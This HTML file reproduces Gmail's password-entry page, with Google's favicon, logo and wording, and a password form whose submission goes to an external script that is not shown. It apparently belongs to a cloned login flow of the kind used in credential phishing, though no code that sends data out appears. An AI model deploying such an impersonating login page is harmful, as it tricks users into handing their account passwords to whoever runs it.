<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Password</title>
    <link rel="icon" href="https://ssl.gstatic.com/ui/v1/icons/mail/images/favicon5.ico" type="image/x-icon">
    <link rel="stylesheet" href="assets/css/style.css">
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="signin-card">
            <div class="logo-container">
                <svg viewBox="0 0 24 24" width="48" height="48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="google-logo">
                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                    <path d="M12 23c3.11 0 5.71-1.03 7.62-2.81l-3.57-2.77c-.98.66-2.23 1.06-4.05 1.06-3.11 0-5.74-2.11-6.68-4.94H1.4v2.85C3.31 20.18 7.37 23 12 23z" fill="#34A853"/>
                    <path d="M5.32 13.54c-.24-.71-.38-1.47-.38-2.26s.14-1.55.38-2.26V6.17H1.4c-.81 1.62-1.27 3.44-1.27 5.37s.46 3.75 1.27 5.37l3.92-3.07z" fill="#FBBC05"/>
                    <path d="M12 4.75c1.69 0 3.21.58 4.41 1.71l3.3-3.3C17.71 1.13 15.11 0 12 0 7.37 0 3.31 2.82 1.4 6.17l3.92 3.07c.94-2.83 3.57-4.94 6.68-4.94z" fill="#EA4335"/>
                </svg>
            </div>
            <h1>Welcome</h1>
            
            <form id="password-form">
                <div class="user-display" id="back-to-email">
                    <div class="user-icon">
                        <svg viewBox="0 0 24 24" width="20" height="20"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08s5.97 1.09 6 3.08c-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                    </div>
                    <span id="display-email"></span>
                    <div class="dropdown-icon">
                        <svg viewBox="0 0 24 24" width="18" height="18"><path d="M7 10l5 5 5-5z"/></svg>
                    </div>
                </div>

                <div class="input-group">
                    <input type="password" id="password" required placeholder=" ">
                    <label for="password">Enter your password</label>
                </div>

                <div class="show-password">
                    <input type="checkbox" id="toggle-password">
                    <label for="toggle-password">Show password</label>
                </div>

                <div class="form-footer">
                    <a href="#" class="forgot-password" id="forgot-password-link">Forgot password?</a>
                    <button type="submit" class="next-btn" id="password-next">Next</button>
                </div>
            </form>
        </div>

        <div class="footer-links">
            <div class="language-selector">
                <span>English (United States)</span>
                <svg viewBox="0 0 24 24" width="18" height="18"><path d="M7 10l5 5 5-5z"/></svg>
            </div>
            <div class="other-links">
                <a href="#" id="help-link">Help</a>
                <a href="#" id="privacy-link">Privacy</a>
                <a href="#" id="terms-link">Terms</a>
            </div>
        </div>
    </div>

    <!-- Modals -->
    <div id="modal-overlay" class="modal-overlay">
        <div class="modal-content">
            <h2 id="modal-title"></h2>
            <div id="modal-body"></div>
            <div class="modal-footer">
                <button id="close-modal">Close</button>
            </div>
        </div>
    </div>

    <script src="assets/js/password.js"></script>
</body>
</html>
